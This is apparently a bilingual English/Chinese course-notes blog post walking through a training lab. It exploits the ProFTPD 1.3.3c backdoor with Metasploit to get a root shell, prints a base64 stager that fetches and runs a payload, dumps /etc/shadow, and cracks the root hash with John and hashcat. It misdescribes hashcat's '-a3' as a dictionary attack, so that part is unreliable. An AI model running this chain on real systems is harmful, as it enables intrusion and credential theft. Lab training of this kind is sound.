---
layout: post
title: "Dumping & Cracking Linux Password Hashes"
date: "2023-07-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Dumping & Cracking Linux Hashes
# Dumping & Cracking Linux Password Hashes
## Linux Password Hashes
Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.

All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd

We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.

All the encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: /etc/shadow

The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

The shadow file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

![value-hashing-algorithm.png](/img/in-post/ine/value-hashing-algorithm.png)

simultaneously是一个副词，意思是“同时地”。

# 密码哈希的转储和破解
# 转储和破解Linux密码哈希
## Linux密码哈希
Linux具有多用户支持，因此，多个用户可以同时访问系统。从安全角度来看，这既是优点又是缺点，因为多个帐户为攻击者提供了多个访问向量，从而增加了服务器的总体风险。

Linux上所有帐户的信息都存储在passwd文件中，该文件位于：/etc/passwd

我们无法查看passwd文件中用户的密码，因为它们是加密的，而且passwd文件可被系统上的任何用户读取。

所有用户的加密密码都存储在shadow文件中。它可以在以下目录中找到：/etc/shadow

只有root帐户才能访问和读取shadow文件，这是一个非常重要的安全功能，因为它防止系统上的其他帐户访问哈希密码。

shadow文件提供了有关正在使用的哈希算法和密码哈希的信息，这非常有帮助，因为我们能够确定正在使用的哈希算法的类型和强度。我们可以通过查看用户名后面由美元符号（$）包含的数字来确定这一点。

![value-hashing-algorithm.png](/img/in-post/ine/value-hashing-algorithm.png)


# Demo: Dumping & Cracking Linux Password Hashes（演示：转储和破解Linux密码哈希）
Caveat 是一个拉丁语词汇，意为“警告”或“注意事项”。在法律术语中，它通常指一项声明或条件，用于限制或解释一个协议或交易的某些方面。它可以作为一种保护机制，用于确保某些事情被注意到或协议的某些方面得到了适当的关注。

In order for you to dump Linux password hashes, you need to have administrative or in the case of Linux root privileges, either through the root account or through an account that is part of the root group, or the sudo group. To put it simply, you need access to the target system via root account or an account that has sudo or root privileges associated to it. 

Kali Linux : 192.234.199.2

Target IP Adress : 192.234.199.3

```
nmap -sV 192.234.199.3
```

```
searchsploit ProFTPD
```

Because we're going to be making use of a post exploitation module, and we're going to be saving the credentials or hashes that we dump, we need to start up the Postgresql database service, which will consequently allow us to utilize the Metasploit Framework database.

```
service postgresql start
```

```
msfconsole
setg RHOSTS 192.234.199.3
search ProFTPD
use exploit/unix/ftp/proftpd_133c_backdoor
show options
exploit
```

This should provide me with a command shell session, which I will then upgrade to a meterpreter session. We should get a command shell session.

Before we upgrade this command shell session, which is non-interactive, let us access the shadow file.

```
/bin/bash -i
```

We currently have root access on the target system, which means we do not need to elevate our privileges.

```
cat /etc/shadow
```

The shadow file contains the username and then the value of the hashing algorithm. The value is encapsulated by the dollar symbol. So if it's six, then that means that the hashing algorithm is SHA-512. So that means that the root user password has been encrypted or hashed using the SHA-512 algorithm. That's a very important thing to take into consideration, especially when you're cracking Linux user account password hashes.

The way you copy it is very important. There's a Metasplot Framework module that can be used to unhash or unshadow this particular hash. And it'll save that for you in a file or a text file.

```
^Z
```

If I list out my sessions, I have the command shell session, which I will upgrade to a meterpreter session.

```
sessions
sessions -u 1
```

We've obtained a meterpreter session.

```
sessions
```

This is pertinent to Linux systems.

[Linux Gather Dump Password Hashes for Linux Systems](https://www.rapid7.com/db/modules/post/linux/gather/hashdump/)

Linux Gather Dump Password Hashes for Linux Systems

Post Module to dump the password hashes for all users on a Linux System

在Linux系统上获取密码哈希值的后置模块。

这是一个用于在Linux系统上获取所有用户密码哈希值的后置模块。

```
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2
run
exit -y
```

cat the Unshadowed Password File. 

I'm going to decompress it. It is a gizp archieve. We're decompressing it or unarciving it first. That is going to decompress it and we should have the txt file.

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

If you want to crack a Linux hash with John, the most important piece of information is the hashing algorithm used. In this case, the hashing algorithm is SHA-512. We then specify the path to the file that contains the hash. We can then specify the wordlist that we would like to use.

```
john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

该命令是使用 John the Ripper 工具进行密码破解的命令，以下是各个参数的解释：

- `john`: 密码破解工具的名称。
- `--format=sha512crypt`: 指定密码哈希的格式。在这种情况下，`--format=sha512crypt` 表示使用 SHA-512 Crypt 格式的密码哈希。
- `linux.hashes.txt`: 存储了要破解的密码哈希值的文件。该文件应该包含一行或多行密码哈希。
- `--wordlist=/usr/share/wordlists/rockyou.txt`: 指定字典文件的路径。在这种情况下，使用了一个常用的字典文件 `rockyou.txt`，该字典文件包含了大量常见的密码和短语。

因此，该命令的目的是使用 John the Ripper 工具，针对文件 `linux.hashes.txt` 中的密码哈希（SHA-512 Crypt 格式）进行破解，使用字典文件 `rockyou.txt` 进行尝试破解密码。

The command you provided, `john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`, is used for password cracking using the John the Ripper tool. Here's the breakdown of each component:

- `john`: The name of the password cracking tool.
- `--format=sha512crypt`: Specifies the format of the password hash. In this case, `--format=sha512crypt` indicates the use of the SHA-512 Crypt format for password hashes.
- `linux.hashes.txt`: The file that contains the password hashes to be cracked. This file should contain one or more lines of password hashes.
- `--wordlist=/usr/share/wordlists/rockyou.txt`: Specifies the path to the dictionary file. In this case, the popular `rockyou.txt` dictionary file is used, which contains a large number of common passwords and phrases.

Therefore, the purpose of this command is to use the John the Ripper tool to crack the password hashes stored in the `linux.hashes.txt` file, which are in the SHA-512 Crypt format. The cracking process involves attempting various combinations from the dictionary file `rockyou.txt` to find a match for the hashed passwords.

That is how to crack Linux user account password hashes with John the Ripper.

```
hashcat --help | grep 1800
```

In order to perform a brute force attack, and then we specify the mode as 1800. That's the format SHA-512. And then we specify the path to the file that contains the hashes.

```
hashcat -a3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
```

该命令是使用 hashcat 工具进行密码破解的命令，以下是各个参数的解释：

- `hashcat`：密码破解工具的名称。
- `-a3`：指定密码破解的攻击模式。在这种情况下，`-a3` 表示使用基于字典的攻击模式。
- `-m 1800`：指定要破解的密码哈希类型。在这种情况下，`-m 1800` 表示哈希类型为 SHA-512(Unix)。
- `linux.hashes.txt`：存储了要破解的密码哈希值的文件。该文件应该包含一行或多行密码哈希。
- `/usr/share/wordlists/rockyou.txt`：字典文件的路径。在这种情况下，使用了一个常用的字典文件 `rockyou.txt`，该字典文件包含了大量常见的密码和短语。

因此，该命令的目的是使用基于字典的攻击模式，针对文件 `linux.hashes.txt` 中的密码哈希（SHA-512(Unix) 类型）进行破解，使用字典文件 `rockyou.txt` 进行尝试破解密码。

The command you provided, `hashcat -a3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt`, is used for password cracking using the hashcat tool. Here's the breakdown of each component:

- `hashcat`: The name of the password cracking tool.
- `-a3`: Specifies the attack mode for password cracking. In this case, `-a3` indicates the use of a dictionary attack mode.
- `-m 1800`: Specifies the hash type to be cracked. In this case, `-m 1800` represents the SHA-512 (Unix) hash type.
- `linux.hashes.txt`: The file that contains the password hashes to be cracked. This file should contain one or more lines of password hashes.
- `/usr/share/wordlists/rockyou.txt`: The path to the dictionary file. In this case, the popular `rockyou.txt` dictionary file is used, which contains a large number of common passwords and phrases.

Therefore, the purpose of this command is to perform a dictionary attack using the dictionary file `rockyou.txt` to crack the password hashes stored in the `linux.hashes.txt` file, which are of the SHA-512 (Unix) hash type.

# Password Cracker: Linux 密码破解器：Linux 
## Overview  概述 
In this lab, run the following auxiliary modules against the target:

在本实验中，针对目标运行以下辅助模块：

auxiliary/analyze/crack_linux 辅助/分析/crack_linux 

Instructions:   指示： 

This lab is dedicated to you! No other users are on this network :)

本实验室竭诚为您服务！该网络上没有其他用户:)

Once you start the lab, you will have access to a root terminal of a Kali instance

开始实验后，您将可以访问 Kali 实例的根终端

Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.

您的 Kali 有一个 IP 地址为 192.X.Y.2 的接口。运行“ip addr”即可知道X和Y的值。

The target server should be located at the IP address 192.X.Y.3.

目标服务器应位于 IP 地址 192.X.Y.3。

Do not attack the gateway located at IP address 192.X.Y.1

不要攻击位于 IP 地址 192.X.Y.1 的网关

Use /usr/share/metasploit-framework/data/wordlists/unix_users.txt for username dictionary

使用 /usr/share/metasploit-framework/data/wordlists/unix_users.txt 作为用户名字典

## Solutions  解决方案 
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1776.pdf

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-1776.pdf

## 复现视频内容
Kali Linux : 192.123.71.2

Target IP Address : 192.123.71.3

```
root@attackdefense:~# nmap -sV 192.123.71.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-15 11:31 UTC
Nmap scan report for target-1 (192.123.71.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:7B:47:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

```
root@attackdefense:~# searchsploit ProFTPD 1.3.3c
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                    |  Path
                                                                                                                                                  | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                          | exploits/linux/remote/16921.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                | exploits/linux/remote/15662.txt
-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

[ProFTPD-1.3.3c Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/)

```
ProFTPD-1.3.3c Backdoor Command Execution

ProFTPD-1.3.3c 后门命令执行

This module exploits a malicious backdoor that was added to the ProFTPD download archive. This backdoor was present in the proftpd-1.3.3c.tar.[bz2|gz] archive between November 28th 2010 and 2nd December 2010.

此模块利用添加到 ProFTPD 下载存档的恶意后门。这个后门存在于proftpd-1.3.3c.tar中。[bz2|gz] 存档于 2010 年 11 月 28 日至 2010 年 12 月 2 日之间。
```

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > setg RHOSTS 192.123.71.3
RHOSTS => 192.123.71.3
msf5 > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


msf5 > use 4
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > show options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.123.71.3     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 192.123.71.2:4444 
[*] 192.123.71.3:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 6ZnF8bXnPuSA5JQ9;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "6ZnF8bXnPuSA5JQ9\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.123.71.2:4444 -> 192.123.71.3:52424) at 2023-07-15 11:40:35 +0000

```

```
/bin/bash -i
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/# whoami
whoami
root
root@victim-1:/# id
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@victim-1:/# cat /etc/shadow
cat /etc/shadow
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
daemon:*:18311:0:99999:7:::
bin:*:18311:0:99999:7:::
sys:*:18311:0:99999:7:::
sync:*:18311:0:99999:7:::
games:*:18311:0:99999:7:::
man:*:18311:0:99999:7:::
lp:*:18311:0:99999:7:::
mail:*:18311:0:99999:7:::
news:*:18311:0:99999:7:::
uucp:*:18311:0:99999:7:::
proxy:*:18311:0:99999:7:::
www-data:*:18311:0:99999:7:::
backup:*:18311:0:99999:7:::
list:*:18311:0:99999:7:::
irc:*:18311:0:99999:7:::
gnats:*:18311:0:99999:7:::
nobody:*:18311:0:99999:7:::
_apt:*:18311:0:99999:7:::
root@victim-1:/# ^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.123.71.2:4444 -> 192.123.71.3:48342 (192.123.71.3)

msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.123.71.2:4433 
[*] Sending stage (980808 bytes) to 192.123.71.3
[*] Meterpreter session 2 opened (192.123.71.2:4433 -> 192.123.71.3:50578) at 2023-07-15 11:55:28 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2o
CsGaJ4c2Al1towHtHAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/igQxY.b64' ; ((which base64 >&2
 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print 
base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/tLqOD' < '/tmp/igQxY.b64' ; chmod +x '/tmp/tLq
OD' ; '/tmp/tLqOD' & sleep 2 ; rm -f '/tmp/tLqOD' ; rm -f '/tmp/igQxY.b64'"
[-] Output: "[1] 58"
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         shell cmd/unix                                                                           192.123.71.2:4444 -> 192.123.71.3:48342 (192.123.71.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.123.71.3  192.123.71.2:4433 -> 192.123.71.3:50578 (192.123.71.3)
```

```
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   1   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   2   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   3   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   4   auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   5   auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   6   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   7   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   8   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   9   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   10  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   11  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   12  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   13  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   14  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   15  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   16  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   17  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use 10
msf5 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf5 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20230715115911_default_192.123.71.3_linux.hashes_039466.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > exit -y
```

```
msf5 post(linux/gather/hashdump) > exit -y
root@attackdefense:~# cat /root/.msf4/loot/20230715115911_default_192.123.71.3_linux.hashes_039466.txt
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
```

```
root@attackdefense:~# gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```
root@attackdefense:~# john --format=sha512crypt /root/.msf4/loot/20230715115911_default_192.123.71.3_linux.hashes_039466.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 48 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (root)
1g 0:00:00:08 DONE (2023-07-15 12:06) 0.1126g/s 691.8p/s 691.8c/s 691.8C/s 123456..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
root@attackdefense:~# hashcat --help | grep 1800
  18000 | Keccak-512                                       | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash
   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems
```

```
root@attackdefense:~# hashcat -a3 -m 1800 /root/.msf4/loot/20230715115911_default_192.123.71.3_linux.hashes_039466.txt /usr/share/wordlists/rockyou.txt

$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:password
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQ...hLQBb.
Time.Started.....: Sat Jul 15 12:18:02 2023 (0 secs)
Time.Estimated...: Sat Jul 15 12:18:02 2023 (0 secs)
Guess.Mask.......: password [8]
Guess.Queue......: 4/14336793 (0.00%)
Speed.#1.........:        5 H/s (0.07ms) @ Accel:64 Loops:16 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: password -> password
```